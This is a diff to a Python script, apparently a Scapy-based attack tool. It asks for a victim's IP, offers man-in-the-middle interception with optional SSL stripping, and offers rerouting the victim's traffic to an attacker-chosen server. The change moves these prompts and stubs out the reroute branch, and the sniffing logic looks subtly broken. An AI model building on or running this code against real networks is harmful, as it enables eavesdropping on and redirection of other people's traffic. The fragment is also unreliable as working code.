@@ -22,6 +22,11 @@ def main():
             targets = input("Enter 'victim ip, server ip' Can both be none").strip().lower()
             goal = input("Enter a goal: mitm, ownServer").strip().lower()
             parts = [p.strip() for p in targets.split(',')]
+            if goal == "ownserver":
+                ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
+                    
+            elif goal == "mitm":
+                sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
             
             if len(parts) == 2:
                 victim_ip = parts[0] if parts[0] != "none" else None
@@ -50,10 +55,10 @@ def main():
                 ownServer = ""
                 sslStrip = ""
                 if goal == "ownserver":
-                    ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
+                    #now reroute to other website
+                    return
                     
                 elif goal == "mitm":
-                    sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
                     pkt = sc.sniff(filter="tcp", store=0)
                     if pkt.haslayer(sc.TCP):
                         tcp = pkt[sc.TCP]
